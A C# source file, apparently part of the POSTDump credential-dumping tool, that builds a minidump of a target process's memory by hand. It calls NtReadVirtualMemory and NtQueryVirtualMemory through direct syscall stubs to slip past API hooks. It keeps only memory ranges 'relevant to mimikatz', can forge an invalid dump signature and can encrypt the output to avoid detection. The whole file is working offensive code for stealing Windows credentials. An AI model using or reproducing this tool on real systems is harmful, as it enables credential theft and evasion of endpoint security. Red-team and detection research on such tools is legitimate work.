using System;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using DInvoke = DCall.DynamicInvoke;

namespace POSTMiniDump
{
    public static class MiniDump
    {
        [DllImport("ntdll.dll")]
        static extern Data.NTSTATUS RtlGetVersion(out Data.OsVersionInfo versionInformation);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        delegate Data.NTSTATUS NtQueryVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, Data.MEMORY_INFORMATION_CLASS MemoryInformationClass, ref Data.MEMORY_BASIC_INFORMATION MemoryInformation, ulong MemoryInformationLength, ref uint ReturnLength);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        internal delegate Data.NTSTATUS NtReadVirtualMemory(IntPtr processHandle, IntPtr baseAddress, IntPtr buffer, uint bytesToRead, ref uint bytesRead);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true, CharSet = CharSet.Ansi)]
        delegate IntPtr GetProcAddress(IntPtr hModule, string procName);

        internal static IntPtr ntread = DInvoke.Generic.GetSyscallStub("NtReadVirtualMemory");
        internal static NtReadVirtualMemory NTRVM = (NtReadVirtualMemory)Marshal.GetDelegateForFunctionPointer(ntread, typeof(NtReadVirtualMemory));

        static IntPtr ntquery = DInvoke.Generic.GetSyscallStub("NtQueryVirtualMemory");
        static NtQueryVirtualMemory NTQVM = (NtQueryVirtualMemory)Marshal.GetDelegateForFunctionPointer(ntquery, typeof(NtQueryVirtualMemory));

        private static bool write_header(Data.dump_context dc, bool InvalidSig)
        {
            Data.MiniDumpHeader  header = new Data.MiniDumpHeader();
            if (InvalidSig)
            {
                Utils.generate_invalid_sig(out dc.Signature, out dc.Version, out dc.ImplementationVersion);
                Console.WriteLine("[*] Using invalid signature");
            }

            header.Signature = dc.Signature;
            header.Version = dc.Version;
            header.ImplementationVersion = dc.ImplementationVersion;
            header.NumberOfStreams = 3; // we only need: SystemInfoStream, ModuleListStream and Memory64ListStream
            header.StreamDirectoryRva = Data.SIZE_OF_HEADER;
            header.CheckSum = 0;
            header.Reserved = 0;
            header.TimeDateStamp = 0;
            header.Flags = 0;

            char[] header_bytesalloc = new char[Data.SIZE_OF_HEADER];
            IntPtr header_bytes = Marshal.AllocHGlobal((int)Data.SIZE_OF_HEADER);
            int offset = 0;
            Utils.MemCopy(new IntPtr(header_bytes.ToInt64() + offset), header.Signature, 4); offset += 4;
            Utils.MemCopy(new IntPtr(header_bytes.ToInt64() + offset), header.Version, 2); offset += 2;
            Utils.MemCopy(new IntPtr(header_bytes.ToInt64() + offset), header.ImplementationVersion, 2); offset += 2;
            Utils.MemCopy(new IntPtr(header_bytes.ToInt64() + offset), header.NumberOfStreams, 4); offset += 4;
            Utils.MemCopy(new IntPtr(header_bytes.ToInt64() + offset), header.StreamDirectoryRva, 4); offset += 4;
            Utils.MemCopy(new IntPtr(header_bytes.ToInt64() + offset), header.CheckSum, 4); offset += 4;
            Utils.MemCopy(new IntPtr(header_bytes.ToInt64() + offset), header.Reserved, 4); offset += 4;
            Utils.MemCopy(new IntPtr(header_bytes.ToInt64() + offset), header.TimeDateStamp, 4); offset += 4;
            Utils.MemCopy(new IntPtr(header_bytes.ToInt64() + offset), header.Flags, 4);

            if (!Utils.append(dc, header_bytes, (uint)header_bytesalloc.Length))
            {
                Console.WriteLine("Failed to write header");
                return false;
            }
            Marshal.FreeHGlobal(header_bytes);
            return true;
        }

        private static bool write_directory(Data.dump_context dc, Data.MiniDumpDirectory directory)
        {
            IntPtr directory_bytes = Marshal.AllocHGlobal((int)Data.SIZE_OF_DIRECTORY);
            int offset = 0;
            Utils.MemCopy(new IntPtr(directory_bytes.ToInt64() + offset), directory.StreamType, 4); offset += 4;
            Utils.MemCopy(new IntPtr(directory_bytes.ToInt64() + offset), directory.DataSize, 4); offset += 4;
            Utils.MemCopy(new IntPtr(directory_bytes.ToInt64() + offset), (uint)directory.Rva, 4);

            if (!Utils.append(dc, directory_bytes, (uint)Data.SIZE_OF_DIRECTORY))
                return false;

            Marshal.FreeHGlobal(directory_bytes);
            return true;
        }

        private static bool write_directories(Data.dump_context dc)
        {
            Data.MiniDumpDirectory system_info_directory = new Data.MiniDumpDirectory();
            system_info_directory.StreamType = 7;
            system_info_directory.DataSize = 0; // this is calculated and written later
            system_info_directory.Rva = 0; // this is calculated and written later
            if (!write_directory(dc, system_info_directory))
            {
                Console.WriteLine("Failed to write directory");
                return false;
            }

            //Console.WriteLine("Writing directory: ModuleListStream");
            Data.MiniDumpDirectory module_list_directory = new Data.MiniDumpDirectory();
            module_list_directory.StreamType = 4;
            module_list_directory.DataSize = 0; // this is calculated and written later
            module_list_directory.Rva = 0; // this is calculated and written later
            if (!write_directory(dc, module_list_directory))
            {
                Console.WriteLine("Failed to write directory");
                return false;
            }

            //Console.WriteLine("Writing directory: Memory64ListStream");
            Data.MiniDumpDirectory memory64_list_directory = new Data.MiniDumpDirectory();
            memory64_list_directory.StreamType = 9;
            memory64_list_directory.DataSize = 0; // this is calculated and written later
            memory64_list_directory.Rva = 0; // this is calculated and written later
            if (!write_directory(dc, memory64_list_directory))
            {
                Console.WriteLine("Failed to write directory");
                return false;
            }

            return true;
        }

        private static bool write_system_info_stream(Data.dump_context dc)
        {
            Data.OsVersionInfo os = new Data.OsVersionInfo();
            Data.MiniDumpSystemInfo system_info = new Data.MiniDumpSystemInfo();

            //Console.WriteLine("Writing SystemInfoStream");

            RtlGetVersion(out os);            
            uint OSMajorVersion = os.MajorVersion;
            uint OSMinorVersion = os.MinorVersion;
            uint OSBuildNumber = os.BuildNumber;
            uint OSPlatformId = os.PlatformId;
            string CSDVersion = Environment.OSVersion.ServicePack;
            
            string arch = Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
            //Enum.TryParse(arch, out system_info.ProcessorArchitecture);
            system_info.ProcessorArchitecture = (Data.ProcessorArchitecture)Enum.Parse(typeof(Data.ProcessorArchitecture), arch);
            system_info.ProcessorLevel = 0;
            system_info.ProcessorRevision = 0;
            system_info.NumberOfProcessors = 0;
            system_info.ProductType = 0x0000001;
            system_info.MajorVersion = OSMajorVersion;
            system_info.MinorVersion = OSMinorVersion;
            system_info.BuildNumber = OSBuildNumber;
            system_info.PlatformId = OSPlatformId;
            system_info.CSDVersionRva = 0; // this is calculated and written later
            system_info.SuiteMask = 0;
            system_info.Reserved2 = 0;

            system_info.ProcessorFeatures1 = 0;
            system_info.ProcessorFeatures2 = 0;
            

            uint stream_size = (uint)Data.SIZE_OF_SYSTEM_INFO_STREAM;
            IntPtr system_info_bytes = Marshal.AllocHGlobal((int)Data.SIZE_OF_SYSTEM_INFO_STREAM);
            int offset = 0;
            Utils.MemCopy(new IntPtr(system_info_bytes.ToInt64() + offset), (short)system_info.ProcessorArchitecture, 2); offset += 2;
            Utils.MemCopy(new IntPtr(system_info_bytes.ToInt64() + offset), system_info.ProcessorLevel, 2); offset += 2;
            Utils.MemCopy(new IntPtr(system_info_bytes.ToInt64() + offset), system_info.ProcessorRevision, 2); offset += 2;
            Utils.MemCopy(new IntPtr(system_info_bytes.ToInt64() + offset), system_info.NumberOfProcessors, 1); offset += 1;
            Utils.MemCopy(new IntPtr(system_info_bytes.ToInt64() + offset), system_info.ProductType, 1); offset += 1;
            Utils.MemCopy(new IntPtr(system_info_bytes.ToInt64() + offset), system_info.MajorVersion, 4); offset += 4;
            Utils.MemCopy(new IntPtr(system_info_bytes.ToInt64() + offset), system_info.MinorVersion, 4); offset += 4;
            Utils.MemCopy(new IntPtr(system_info_bytes.ToInt64() + offset), system_info.BuildNumber, 4); offset += 4;
            Utils.MemCopy(new IntPtr(system_info_bytes.ToInt64() + offset), system_info.PlatformId, 4); offset += 4;
            Utils.MemCopy(new IntPtr(system_info_bytes.ToInt64() + offset), system_info.CSDVersionRva, 4); offset += 4;
            Utils.MemCopy(new IntPtr(system_info_bytes.ToInt64() + offset), system_info.SuiteMask, 2); offset += 2;
            Utils.MemCopy(new IntPtr(system_info_bytes.ToInt64() + offset), system_info.Reserved2, 2); offset += 2;

            Utils.MemCopy(new IntPtr(system_info_bytes.ToInt64() + offset), system_info.ProcessorFeatures1, 8); offset += 8;
            Utils.MemCopy(new IntPtr(system_info_bytes.ToInt64() + offset), system_info.ProcessorFeatures2, 8);

            long stream_rva = dc.rva;
            if (!Utils.append(dc, system_info_bytes, (uint)Data.SIZE_OF_SYSTEM_INFO_STREAM))
            {
                Console.WriteLine("Failed to write the SystemInfoStream");
                return false;
            }
            Marshal.FreeHGlobal(system_info_bytes);

            // write our length in the MiniDumpSystemInfo directory
            GCHandle streamsize = GCHandle.Alloc(stream_size, GCHandleType.Pinned);
            IntPtr pointer3 = streamsize.AddrOfPinnedObject();
            Utils.writeat(dc, (long)Data.SIZE_OF_HEADER + (long)4, pointer3, 4); // header + streamType
            streamsize.Free();

            // write our RVA in the MiniDumpSystemInfo directory
            GCHandle streamrva = GCHandle.Alloc(stream_rva, GCHandleType.Pinned);
            IntPtr pointer4 = streamrva.AddrOfPinnedObject();            
            Utils.writeat(dc, (long)Data.SIZE_OF_HEADER + (long)4 + (long)4, pointer4, 4); // header + streamType + Location.DataSize
            streamrva.Free();
            
            // write the service pack
            IntPtr sp_rva = new IntPtr(dc.rva);
            long Length = CSDVersion.Length;
            GCHandle LengthHandle = GCHandle.Alloc(Length, GCHandleType.Pinned);
            IntPtr LengthPtr = LengthHandle.AddrOfPinnedObject();
            // write the length
            if (!Utils.append(dc, LengthPtr, 4))
            {
                Console.WriteLine("Failed to write the SystemInfoStream");
                return false;
            }
            LengthHandle.Free();

            // write the service pack name
            GCHandle CSDVersionHandle = GCHandle.Alloc(CSDVersion, GCHandleType.Pinned);
            IntPtr CSDVersionAddr = CSDVersionHandle.AddrOfPinnedObject();
            if (!Utils.append(dc, CSDVersionAddr, (uint)Environment.OSVersion.ServicePack.Length))
            {
                Console.WriteLine("Failed to write the SystemInfoStream");
                return false;
            }
            CSDVersionHandle.Free();

            // write the service pack RVA in the SystemInfoStream
            GCHandle gch = GCHandle.Alloc(sp_rva, GCHandleType.Pinned);
            IntPtr pointer5 = gch.AddrOfPinnedObject();
            Utils.writeat(dc, stream_rva + 24, pointer5, 4); // addrof CSDVersionRva
            gch.Free();

            return true;
        }

        private static List<Data.PModuleInfo> write_module_list_stream(Data.dump_context dc)
        {
            IntPtr Handle = dc.hProcess;
            List<Data.PModuleInfo> moduleslist = new List<Data.PModuleInfo>();

            moduleslist = Modules.find_modules(dc.hProcess);
            if (moduleslist.Count == 0)
            {
                Console.WriteLine("Could not find modules");
                return null;
            }
            
            uint number_of_modules = 0;
            
            foreach (Data.PModuleInfo module in moduleslist)
            {
                number_of_modules++;
                module.name_rva = dc.rva;
                uint full_name_length = (uint)module.dll_name.ToString().Length;
                full_name_length++;
                full_name_length *= 2;

                IntPtr namelengthbuffer = Marshal.AllocHGlobal((int)full_name_length);
                Utils.MemCopy(namelengthbuffer, full_name_length, 4);
                // write the length of the name
                if (!Utils.append(dc, namelengthbuffer, 4))
                {
                    Console.WriteLine("Failed to write the ModuleListStream");
                    return null;
                }
                Marshal.FreeHGlobal(namelengthbuffer);

                // write the path
                if (!Utils.append(dc, module.dll_name.Buffer, full_name_length))
                {
                    Console.WriteLine("Failed to write the ModuleListStream");
                    return null;
                }
            }
            
            long stream_rva = dc.rva;
            // write the number of modules
            IntPtr modulesnumber = Marshal.AllocHGlobal((int)(number_of_modules));
            Utils.MemCopy(modulesnumber, (uint)number_of_modules, 4);
            if (!Utils.append(dc, modulesnumber, 4))
            {
                Console.WriteLine("Failed to write the ModuleListStream");
                return null;
            }
            
            IntPtr module_bytes = Marshal.AllocHGlobal((int)Data.SIZE_OF_MINIDUMP_MODULE);
            foreach (Data.PModuleInfo curr_module in moduleslist)
            {
                Data.MiniDumpModule module = new Data.MiniDumpModule();
                module.BaseOfImage = curr_module.moduleinfo.lpBaseOfDll;
                module.SizeOfImage = curr_module.moduleinfo.SizeOfImage;
                module.CheckSum = curr_module.CheckSum;
                module.TimeDateStamp = curr_module.TimeDateStamp;
                module.ModuleNameRva = (IntPtr)curr_module.name_rva;
                module.VersionInfo.dwSignature = 0;
                module.VersionInfo.dwStrucVersion = 0;
                module.VersionInfo.dwFileVersionMS = 0;
                module.VersionInfo.dwFileVersionLS = 0;
                module.VersionInfo.dwProductVersionMS = 0;
                module.VersionInfo.dwProductVersionLS = 0;
                module.VersionInfo.dwFileFlagsMask = 0;
                module.VersionInfo.dwFileFlags = 0;
                module.VersionInfo.dwFileOS = 0;
                module.VersionInfo.dwFileType = 0;
                module.VersionInfo.dwFileSubtype = 0;
                module.VersionInfo.dwFileDateMS = 0;
                module.VersionInfo.dwFileDateLS = 0;
                module.CvRecord.DataSize = 0;
                module.CvRecord.rva = 0;
                module.MiscRecord.DataSize = 0;
                module.MiscRecord.rva = 0;
                module.Reserved0 = 0;
                module.Reserved1 = 0;

                int offset = 0;
                Utils.MemCopy(new IntPtr(module_bytes.ToInt64() + offset), module.BaseOfImage, 8); offset += 8;
                Utils.MemCopy(new IntPtr(module_bytes.ToInt64() + offset), module.SizeOfImage, 4); offset += 4;
                Utils.MemCopy(new IntPtr(module_bytes.ToInt64() + offset), module.CheckSum, 4); offset += 4;
                Utils.MemCopy(new IntPtr(module_bytes.ToInt64() + offset), module.TimeDateStamp, 4); offset += 4;
                Utils.MemCopy(new IntPtr(module_bytes.ToInt64() + offset), module.ModuleNameRva, 4); offset += 4;
                Utils.MemCopy(new IntPtr(module_bytes.ToInt64() + offset), module.VersionInfo.dwSignature, 4); offset += 4;
                Utils.MemCopy(new IntPtr(module_bytes.ToInt64() + offset), module.VersionInfo.dwStrucVersion, 4); offset += 4;
                Utils.MemCopy(new IntPtr(module_bytes.ToInt64() + offset), module.VersionInfo.dwFileVersionMS, 4); offset += 4;
                Utils.MemCopy(new IntPtr(module_bytes.ToInt64() + offset), module.VersionInfo.dwFileVersionLS, 4); offset += 4;
                Utils.MemCopy(new IntPtr(module_bytes.ToInt64() + offset), module.VersionInfo.dwProductVersionMS, 4); offset += 4;
                Utils.MemCopy(new IntPtr(module_bytes.ToInt64() + offset), module.VersionInfo.dwProductVersionLS, 4); offset += 4;
                Utils.MemCopy(new IntPtr(module_bytes.ToInt64() + offset), module.VersionInfo.dwFileFlagsMask, 4); offset += 4;
                Utils.MemCopy(new IntPtr(module_bytes.ToInt64() + offset), module.VersionInfo.dwFileFlags, 4); offset += 4;
                Utils.MemCopy(new IntPtr(module_bytes.ToInt64() + offset), module.VersionInfo.dwFileOS, 4); offset += 4;
                Utils.MemCopy(new IntPtr(module_bytes.ToInt64() + offset), module.VersionInfo.dwFileType, 4); offset += 4;
                Utils.MemCopy(new IntPtr(module_bytes.ToInt64() + offset), module.VersionInfo.dwFileSubtype, 4); offset += 4;
                Utils.MemCopy(new IntPtr(module_bytes.ToInt64() + offset), module.VersionInfo.dwFileDateMS, 4); offset += 4;
                Utils.MemCopy(new IntPtr(module_bytes.ToInt64() + offset), module.VersionInfo.dwFileDateLS, 4); offset += 4;
                Utils.MemCopy(new IntPtr(module_bytes.ToInt64() + offset), module.CvRecord.DataSize, 4); offset += 4;
                Utils.MemCopy(new IntPtr(module_bytes.ToInt64() + offset), (ulong)module.CvRecord.rva, 4); offset += 4;
                Utils.MemCopy(new IntPtr(module_bytes.ToInt64() + offset), module.MiscRecord.DataSize, 4); offset += 4;
                Utils.MemCopy(new IntPtr(module_bytes.ToInt64() + offset), (ulong)module.MiscRecord.rva, 4); offset += 4;
                Utils.MemCopy(new IntPtr(module_bytes.ToInt64() + offset), module.Reserved0, 8); offset += 8;
                Utils.MemCopy(new IntPtr(module_bytes.ToInt64() + offset), module.Reserved1, 8);

                if (!Utils.append(dc, module_bytes, (uint)Data.SIZE_OF_MINIDUMP_MODULE))
                {
                    Console.WriteLine("Failed to write the ModuleListStream");
                    return null;
                }
            }
            
            // write our length in the ModuleListStream directory
            long stream_size = 4 + number_of_modules * (long)Data.SIZE_OF_MINIDUMP_MODULE;
            IntPtr p = Marshal.AllocHGlobal((int)stream_size);
            Utils.MemCopy(p, (ulong)stream_size, 4);
            Utils.writeat(dc, (long)(Data.SIZE_OF_HEADER + Data.SIZE_OF_DIRECTORY + 4), p, 4); // header + 1 directory + streamType

            // write our RVA in the ModuleListStream directory
            IntPtr p2 = Marshal.AllocHGlobal(Marshal.SizeOf(stream_rva));
            Utils.MemCopy(p2, (ulong)stream_rva, 4);
            Utils.writeat(dc, (long)(Data.SIZE_OF_HEADER + Data.SIZE_OF_DIRECTORY + 4 + 4), p2, 4); // header + 1 directory + streamType + Location.DataSize

            Marshal.FreeHGlobal(p);
            Marshal.FreeHGlobal(p2);
            return moduleslist;
        }

        private static bool is_important_module(IntPtr address, List<Data.PModuleInfo> module_list)
        {
            foreach (Data.PModuleInfo curr_module in module_list)
            {
                //IntPtr rva = IntPtr.Add((IntPtr)curr_module.moduleinfo.lpBaseOfDll, (int)curr_module.moduleinfo.SizeOfImage);
                IntPtr rva = new IntPtr(curr_module.moduleinfo.lpBaseOfDll.ToInt64() + (int)curr_module.moduleinfo.SizeOfImage);
                if ((ulong)address >= (ulong)curr_module.moduleinfo.lpBaseOfDll && (ulong)address < (ulong)rva)
                    return true;
            }
            return false;
        }

        private static List<Data.MiniDumpMemoryDescriptor64> write_memory64_list_stream(Data.dump_context dc, List<Data.PModuleInfo> modulelist)
        {

            List<Data.MiniDumpMemoryDescriptor64> memory_ranges;
            long stream_rva = dc.rva;
            memory_ranges = get_memory_range(dc, modulelist);
            if (memory_ranges.Count == 0)
            {
                Console.WriteLine("Failed to get memory ranges");
                return null;
            }

            // write the number of ranges
            Data.MiniDumpMemoryDescriptor64 curr_range = new Data.MiniDumpMemoryDescriptor64();
            uint number_of_ranges = (uint)memory_ranges.Count;

            IntPtr number_of_rangesBuff = Marshal.AllocHGlobal(Marshal.SizeOf((int)number_of_ranges));
            Utils.MemCopy(number_of_rangesBuff, number_of_ranges, 8);
            if (!Utils.append(dc, number_of_rangesBuff, 8))
            {
                Console.WriteLine("Failed to write Memory64ListStream");
                return null;
            }

            // make sure we don't overflow stream_size
            if (16 + 16 * number_of_ranges > 0xffffffff)
            {
                Console.WriteLine("Too many ranges!");
                Marshal.FreeHGlobal(number_of_rangesBuff);
                return null;
            }

            // write the rva of the actual memory content
            uint stream_size = (16 + 16 * (uint)number_of_ranges);
            long base_rva = stream_rva + stream_size;
            IntPtr base_rvaBuff = Marshal.AllocHGlobal(Marshal.SizeOf(base_rva));
            Utils.MemCopy(base_rvaBuff, (ulong)base_rva, 8);
            if (!Utils.append(dc, base_rvaBuff, 8))
            {
                Console.WriteLine("Failed to write the Memory64ListStream");
                Marshal.FreeHGlobal(base_rvaBuff);
                return null;
            }

            foreach (Data.MiniDumpMemoryDescriptor64 range in memory_ranges)
            {
                IntPtr buffer = Marshal.AllocHGlobal(8);
                IntPtr d = range.StartOfMemoryRange;
                Utils.MemCopy(buffer, d, 8);
                if (!Utils.append(dc, buffer, 8))
                {
                    Console.WriteLine("Failed to write the Memory64ListStream");
                    Marshal.FreeHGlobal(buffer);
                    return null;
                }
                Marshal.FreeHGlobal(buffer);

                buffer = Marshal.AllocHGlobal(8);
                Utils.MemCopy(buffer, range.DataSize, 8);
                if (!Utils.append(dc, buffer, 8))
                {
                    Console.WriteLine("Failed to write the Memory64ListStream");
                    Marshal.FreeHGlobal(buffer);
                    return null;
                }
                Marshal.FreeHGlobal(buffer);

                // write our length in the Memory64ListStream directory
                buffer = Marshal.AllocHGlobal(Marshal.SizeOf(stream_size));
                Utils.MemCopy(buffer, stream_size, (uint)Marshal.SizeOf(stream_size));
                Utils.writeat(dc, (long)(Data.SIZE_OF_HEADER + Data.SIZE_OF_DIRECTORY * 2 + 4), buffer, 4); // header + 2 directories + streamType
                Marshal.FreeHGlobal(buffer);

                // write our RVA in the Memory64ListStream directory
                buffer = Marshal.AllocHGlobal(Marshal.SizeOf(stream_rva));
                Utils.MemCopy(buffer, (ulong)stream_rva, (uint)Marshal.SizeOf(stream_rva));
                Utils.writeat(dc, (long)(Data.SIZE_OF_HEADER + Data.SIZE_OF_DIRECTORY * 2 + 4 + 4), buffer, 4); // header + 2 directories + streamType + Location.DataSize
                Marshal.FreeHGlobal(buffer);
            }

            foreach (Data.MiniDumpMemoryDescriptor64 range in memory_ranges)
            {
                IntPtr buffer = Marshal.AllocHGlobal((int)range.DataSize);
                if (buffer == IntPtr.Zero)
                {
                    Console.WriteLine("Failed to HeapAlloc!");
                    return null;
                }
                uint ByteRead = 0;
                Data.NTSTATUS status = NTRVM(dc.hProcess, range.StartOfMemoryRange, buffer, (uint)range.DataSize, ref ByteRead);
                if (status != 0 && status != Data.NTSTATUS.PartialCopy)
                {
                    Console.WriteLine($"Failed to read memory range {curr_range.StartOfMemoryRange}");
                }

                if ((UInt32)range.DataSize > 0xffffffff)
                {
                    Console.WriteLine("The current range is larger that the 32-bit address space!");
                    range.DataSize = (ulong)0xffffffff;
                }

                if (!Utils.append(dc, buffer, (uint)range.DataSize))
                {
                    Console.WriteLine("Failed to write the Memory64ListStream");
                    Utils.intFree(buffer);
                    buffer = IntPtr.Zero;
                    return null;
                }

                Utils.intFree(buffer);

            }

            return memory_ranges;
        }


        private static List<Data.MiniDumpMemoryDescriptor64> get_memory_range(Data.dump_context dc, List<Data.PModuleInfo> module_list)
        {

            //Console.WriteLine("Getting memory ranges");
            IntPtr prochandle = dc.hProcess;
            Data.MEMORY_BASIC_INFORMATION mbi = new Data.MEMORY_BASIC_INFORMATION();
            Data.MEMORY_INFORMATION_CLASS mic = new Data.MEMORY_INFORMATION_CLASS();
            uint returnL = 0;

            List<Data.MiniDumpMemoryDescriptor64> ranges_list = new List<Data.MiniDumpMemoryDescriptor64>();
            
            IntPtr base_address = IntPtr.Zero;
            IntPtr current_address = IntPtr.Zero;
            ulong region_size = 0;
            int number_of_ranges = 0;

            while (true)
            {
                Data.MiniDumpMemoryDescriptor64 new_range = new Data.MiniDumpMemoryDescriptor64();
                Data.NTSTATUS status = NTQVM(dc.hProcess, current_address, mic, ref mbi, (ulong)Convert.ToInt64(Marshal.SizeOf(mbi)), ref returnL);
                if (status != Data.NTSTATUS.Success)
                {
                    break;
                }
                base_address = mbi.BaseAddress;
                region_size = mbi.RegionSize;

                if ( (base_address.ToInt64() + (long)region_size) < base_address.ToInt64() )
                {
                    break;
                }

                // next memory range
                current_address = Utils.RVA(base_address, (long)region_size);

                if (mbi.State != Data.StateEnum.MEM_COMMIT)
                {
                    continue;
                }
                // ignore mapped pages
                if (mbi.Type == Data.TypeEnum.MEM_MAPPED)
                {
                    continue;
                }
                // ignore pages with PAGE_NOACCESS
                if (mbi.Protect == Data.AllocationProtectEnum.PAGE_NOACCESS)
                {
                    continue;
                }
                // ignore pages with PAGE_GUARD
                if (mbi.Protect == Data.AllocationProtectEnum.PAGE_GUARD)
                {
                    continue;
                }
                // ignore pages with PAGE_EXECUTE
                if (mbi.Protect == Data.AllocationProtectEnum.PAGE_EXECUTE)
                {
                    continue;
                }
                // ignore modules that are not relevant to mimikatz
                if (mbi.Type == Data.TypeEnum.MEM_IMAGE && !is_important_module(base_address, module_list))
                {
                    continue;
                }
                if (dc.BaseAddress == base_address)
                {
                    Console.WriteLine("nop");
                    continue;
                }

                new_range.next = null;
                new_range.StartOfMemoryRange = base_address;
                new_range.DataSize = region_size;
                new_range.State = mbi.State;
                new_range.Protect = mbi.Protect;
                new_range.Type = mbi.Type;
                ranges_list.Add(new_range);
                number_of_ranges++;
            }

            if (ranges_list.Count == 0)
            {
                Console.WriteLine("Failed to enumerate memory ranges");
                return null;
            }

            return ranges_list;
        }

        
        public static bool POSTDumpWriteDump(Data.dump_context dc, bool InvalidSig=false, bool encrypt=false)
        {
            
            if (!write_header(dc, InvalidSig))
            {
                return false;
            }
            
            if (!write_directories(dc))
            {
                return false;
            }
            
            if (!write_system_info_stream(dc))
            {
                return false;
            }
            
            List<Data.PModuleInfo> modules_list = write_module_list_stream(dc);
            if (modules_list.Count == 0)
            {
                Console.WriteLine("Failed to get modules list!");
                return false;
            }

            List<Data.MiniDumpMemoryDescriptor64> memory_ranges = new List<Data.MiniDumpMemoryDescriptor64>();
            memory_ranges = write_memory64_list_stream(dc, modules_list);
            if (memory_ranges.Count == 0)
            {
                Console.WriteLine("Failed to get memory ranges!");
                return false;
            }
            Console.WriteLine($"[*] Dump succeed! size: {(dc.rva / 1024) / 1024} MiB");

            if (encrypt)
            {
                Utils.encrypt_dump(dc.BaseAddress, dc.rva);
                Console.WriteLine("[*] Dump encrypted!");
            }

            return true;
        }
    }
}
